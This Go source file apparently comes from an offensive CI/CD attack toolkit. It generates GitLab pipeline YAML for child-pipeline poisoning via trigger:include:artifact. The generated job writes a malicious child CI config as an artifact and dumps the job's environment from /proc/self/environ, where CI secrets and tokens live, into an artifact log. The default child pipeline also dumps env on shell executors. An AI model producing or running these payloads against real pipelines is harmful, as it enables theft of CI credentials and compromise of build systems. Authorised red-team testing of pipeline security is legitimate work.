package payloads

import (
	"fmt"
	"strings"
)

// TriggerArtifactOptions configures a trigger:include:artifact poisoning payload.
type TriggerArtifactOptions struct {
	Common             CommonOptions
	MaliciousCIContent string // child pipeline YAML content
	ArtifactPath       string // artifact filename (default: "child-ci.yml")
	TriggerProject     string // downstream project path (optional)
	Strategy           string // depend|none (default: "depend")
}

// GenerateTriggerArtifactYAML generates a pipeline that demonstrates dynamic
// child pipeline injection via trigger:include:artifact. The trigger directive
// is documented in comments (child pipelines require specific branch/project
// configuration). The job generates a malicious child CI YAML as an artifact
// and exfiltrates env via hexdump reversal.
func GenerateTriggerArtifactYAML(o TriggerArtifactOptions) string {
	name, stage := o.Common.defaults("trigger-artifact")
	if o.ArtifactPath == "" {
		o.ArtifactPath = "child-ci.yml"
	}
	if o.Strategy == "" {
		o.Strategy = "depend"
	}
	if strings.TrimSpace(o.MaliciousCIContent) == "" {
		o.MaliciousCIContent = defaultChildPipeline()
	}

	return fmt.Sprintf(`# Dynamic child pipeline injection via trigger:include:artifact
# In production, stage 2 would trigger the child pipeline:
#   trigger-child:
#     trigger:
#       include:
#         - artifact: %s
#           job: %s
#       strategy: %s

stages: [%s]

%s:
  stage: %s%s%s
  script:
    - |
      # Generate malicious child pipeline config as artifact
      cat > %s << 'CHILD_CI'
%s
      CHILD_CI
      echo "Child pipeline config written to %s"
      # Exfil via hexdump + sed reversal (binary-safe env read)
      hexdump -ve '1/1 "%%.2x"' /proc/self/environ 2>/dev/null | \
        sed 's/00/\n/g' | while read hex; do echo -ne "\x$hex" 2>/dev/null; done | \
        tr '\0' '\n' | sort > .trigger-exfil.log 2>/dev/null || env | sort > .trigger-exfil.log
  artifacts:
    when: always
    paths:
      - %s
      - .trigger-exfil.log
    expire_in: 1 day
  allow_failure: true%s
`, o.ArtifactPath, name, o.Strategy,
		stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		o.ArtifactPath, indentBlock(strings.TrimSpace(o.MaliciousCIContent), 6), o.ArtifactPath,
		o.ArtifactPath,
		rulesManual(o.Common.Manual))
}

func defaultChildPipeline() string {
	return `stages: [attack]
child-exploit:
  stage: attack
  tags: [shell_executor]
  script:
    - env | sort > child-output.log
  artifacts:
    when: always
    paths:
      - child-output.log
  allow_failure: true`
}
